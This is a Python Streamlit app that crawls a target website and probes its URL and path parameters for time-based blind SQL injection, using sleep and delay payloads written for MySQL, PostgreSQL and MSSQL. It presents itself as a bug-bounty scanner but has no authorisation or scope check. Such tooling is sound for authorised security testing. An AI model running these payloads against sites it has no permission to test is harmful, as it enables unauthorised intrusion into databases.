import streamlit as st
import asyncio, aiohttp, time, statistics, random, ipaddress, re
import pandas as pd
from urllib.parse import urlparse, urljoin, parse_qs
from selectolax.parser import HTMLParser

# =========================
# CONFIG
# =========================
USER_AGENT = "SovereignScanner/7.0 (Responsible Security Research)"
SQLI_SLEEP = 5
MAX_RETRIES = 2
RANDOM_DELAY = (0.3, 1.1)

SQLI_TECHNIQUES = {
    "MySQL": "1' AND (SELECT SLEEP(5))--",
    "PostgreSQL": "1' AND (SELECT PG_SLEEP(5))--",
    "MSSQL": "1'; WAITFOR DELAY '0:0:5'--",
    "Generic": "1' AND SLEEP(5)--"
}

PATH_PARAM_REGEX = re.compile(r"/(\d+)(?=/|$)")

# =========================
# ENGINE
# =========================
class SovereignEngine:
    def __init__(self, base_url, concurrency, crawl_limit, progress, status, table):
        self.base_url = base_url.rstrip("/")
        self.sem = asyncio.Semaphore(concurrency)
        self.queue = asyncio.Queue()
        self.visited = set()
        self.findings = []
        self.crawl_limit = crawl_limit
        self.progress = progress
        self.status = status
        self.table = table

    async def safe_resolve(self, host):
        try:
            infos = await asyncio.get_event_loop().getaddrinfo(host, None)
            ip = ipaddress.ip_address(infos[0][4][0])
            if ip.is_private or ip.is_loopback or ip.is_reserved:
                return None
            return str(ip)
        except:
            return None

    def parse_page(self, url, html):
        parser = HTMLParser(html)
        links, params = set(), set()

        for a in parser.css("a"):
            href = a.attributes.get("href")
            if href and href.startswith("/"):
                links.add(urljoin(self.base_url, href))

        parsed = urlparse(url)
        for p in parse_qs(parsed.query):
            params.add(p)

        for m in PATH_PARAM_REGEX.finditer(parsed.path):
            params.add(f"path:{m.group(1)}")

        return links, params

    async def baseline(self, session, url, headers):
        samples = []
        for _ in range(3):
            try:
                t0 = time.perf_counter()
                async with self.sem:
                    async with session.get(url, headers=headers, timeout=15):
                        pass
                samples.append(time.perf_counter() - t0)
                await asyncio.sleep(random.uniform(*RANDOM_DELAY))
            except:
                continue
        if len(samples) < 2:
            return None
        return {
            "avg": statistics.mean(samples),
            "stdev": max(statistics.stdev(samples), 0.05)
        }

    async def test_sqli(self, session, url, headers, base, param):
        for db, payload in SQLI_TECHNIQUES.items():
            try:
                test_url, params = url, None

                if param.startswith("path:"):
                    val = param.split(":")[1]
                    test_url = re.sub(rf"/{val}(?=/|$)", f"/{payload}", url)
                else:
                    params = {param: payload}

                t0 = time.perf_counter()
                async with self.sem:
                    async with session.get(test_url, params=params, headers=headers, timeout=25):
                        pass
                delay = time.perf_counter() - t0

                threshold = base["avg"] + (3 * base["stdev"]) + SQLI_SLEEP - 0.5
                if delay > threshold:
                    return {
                        "Type": f"SQL Injection ({db})",
                        "URL": url,
                        "Parameter": param,
                        "Delay": round(delay, 2),
                        "Confidence": "High"
                    }
            except:
                continue
        return None

    async def worker(self, session):
        while True:
            url = await self.queue.get()
            try:
                self.status.text(f"🔍 Scanning: {url}")
                parsed = urlparse(url)
                ip = await self.safe_resolve(parsed.hostname)
                if not ip:
                    continue

                target = url.replace(parsed.netloc, ip, 1)
                headers = {"Host": parsed.netloc, "User-Agent": USER_AGENT}

                async with self.sem:
                    async with session.get(target, headers=headers, timeout=15, ssl=False) as r:
                        if r.status != 200:
                            continue
                        html = await r.text()

                links, params = self.parse_page(url, html)
                base = await self.baseline(session, target, headers)
                if not base:
                    continue

                for p in params:
                    evidence = await self.test_sqli(session, target, headers, base, p)
                    if evidence:
                        self.findings.append(evidence)
                        self.table.table(pd.DataFrame(self.findings))

                for l in links:
                    if l not in self.visited and len(self.visited) < self.crawl_limit:
                        self.visited.add(l)
                        await self.queue.put(l)

            finally:
                self.queue.task_done()
                self.progress.progress(min(len(self.visited)/self.crawl_limit,1.0))

    async def run(self):
        await self.queue.put(self.base_url)
        self.visited.add(self.base_url)
        async with aiohttp.ClientSession() as session:
            workers = [asyncio.create_task(self.worker(session)) for _ in range(6)]
            await self.queue.join()
            for w in workers:
                w.cancel()
        return self.findings

# =========================
# STREAMLIT UI
# =========================
st.set_page_config("Sovereign Scanner v7", layout="wide")
st.title("🛡️ Sovereign Scanner v7 — Final")
st.caption("Production‑Ready Bug Bounty Engine")

with st.sidebar:
    target = st.text_input("Target URL", "https://example.com")
    concurrency = st.slider("Concurrency", 1, 10, 6)
    crawl_limit = st.number_input("Crawl Limit", 10, 500, 50)
    start = st.button("🚀 Start Scan")

if start and target:
    progress = st.progress(0)
    status = st.empty()
    table = st.empty()

    engine = SovereignEngine(target, concurrency, crawl_limit, progress, status, table)
    with st.spinner("Scanning…"):
        results = asyncio.run(engine.run())

    st.success("✅ Scan Finished")

    if results:
        df = pd.DataFrame(results)
        st.dataframe(df)
        st.download_button("⬇ Download CSV", df.to_csv(index=False), "report.csv")
    else:
        st.info("No vulnerabilities detected.")
